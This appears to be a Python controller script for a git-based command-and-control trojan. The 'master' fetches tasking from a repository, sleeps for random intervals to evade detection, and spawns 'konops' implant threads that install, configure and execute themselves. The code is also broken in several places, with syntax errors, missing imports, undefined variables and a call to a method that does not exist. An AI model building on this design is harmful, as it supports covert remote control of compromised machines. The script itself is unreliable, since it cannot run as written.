#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: XCS, L0WK3Y
"""
import gitwrapper
import random
import time
import thread
import konops

class konops_master:
    def __init__(self, master_id):
        self.master_id = master_id
        self.configured = False
        self.num_of_threads = 0
        self.master_config = "%s.json"%self.master_id

    def configure(self):
        config_file_path = cpath + self.master_config
        response, config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)

        self.configured = True

        config_file_content = json.loads(config_content_json)
        for data in config_file_content:
            self.num_of_threads = data['konops_number']

    def sleep(self):
        sleep_time = random.randint(120, 1000)
        time.sleep(sleep_time)
        
        
    def spawn_konops(self, slave_id):
        try:
            konopas = konops.Konops(slave_id)
            konopas.install_requirements()
            konopas.configure()
            konopas.execute()
        except:
            print("Error spawning the konops.\n")

    def manage_konops_threads(self):
        try:
            thread.start_new_thread(spawn_konops, ("obsv"))
        else:
            print("Error starting the thread.\n")

    def run_master():
        while(self.num_of_threads):
            self.configure()
            self.manage_konops_threads()

if __name__ == '__main__':
    master = konops_master.konops_master("master")
    master.run()


